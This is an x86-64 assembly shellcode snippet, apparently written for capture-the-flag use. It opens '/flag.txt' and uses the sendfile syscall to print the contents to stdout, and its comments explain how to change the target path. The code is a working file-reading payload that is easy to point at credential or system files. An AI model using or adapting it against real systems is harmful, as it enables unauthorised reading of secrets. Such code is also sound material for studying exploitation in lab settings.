global _start

;You need to know ASM to be able to modify this for your needs.
;the r10 register is used for the path to the file.
;by going further you can keep adding and pushing, make sure to align the stack.

section .text
_start:
    mov al, 2
    xor rsi, rsi
    xor rdx, rdx
    push rdx
    push rdx
    mov r10b, 't' ;push in reverse order kids.
    push r10
    mov r10, '/flag.tx' ;modifie file
    push r10
    lea rdi, [rsp]
    syscall

open:
    mov sil , al
    mov rdi, 1
    mov al, 40
    xor rdx, rdx
    mov r10, 256
    syscall

exit:
    mov al, 60
    mov dil, 60
    syscall